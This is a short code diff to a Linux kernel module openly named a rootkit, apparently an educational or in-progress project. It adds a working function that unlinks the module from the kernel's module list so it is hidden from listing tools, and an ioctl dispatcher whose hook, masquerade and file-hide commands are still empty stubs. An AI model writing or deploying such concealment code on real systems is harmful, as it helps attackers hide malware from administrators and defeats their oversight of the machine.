@@ -9,6 +9,7 @@
 #include <linux/uaccess.h>
 #include <linux/cdev.h>
 #include <asm/syscall.h>
+#include <stdbool.h>
 
 #include "rootkit.h"
 
@@ -34,11 +35,41 @@ static int rootkit_release(struct inode *inode, struct file *filp)
     return 0;
 }
 
+static void toggleVisibility(void) {
+    static bool visible = true;
+    static struct list_head *prev = NULL;
+
+    if (visible) {
+        prev = THIS_MODULE->list.prev;
+        list_del(&THIS_MODULE->list);
+    } else {
+        list_add(&THIS_MODULE->list, prev);
+    }
+    visible = !visible;
+}
+
 static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
                           unsigned long arg)
 {
+    int ret = 0;
+
     printk(KERN_INFO "%s\n", __func__);
-    return 0;
+
+    switch (ioctl) {
+    case IOCTL_MOD_HOOK:
+        break;
+    case IOCTL_MOD_HIDE:
+        toggleVisibility();
+        break;
+    case IOCTL_MOD_MASQ:
+        break;
+    case IOCTL_FILE_HIDE:
+        break;
+    default:
+        ret = -EINVAL;
+    }
+
+    return ret;
 }
 
 struct file_operations fops = {
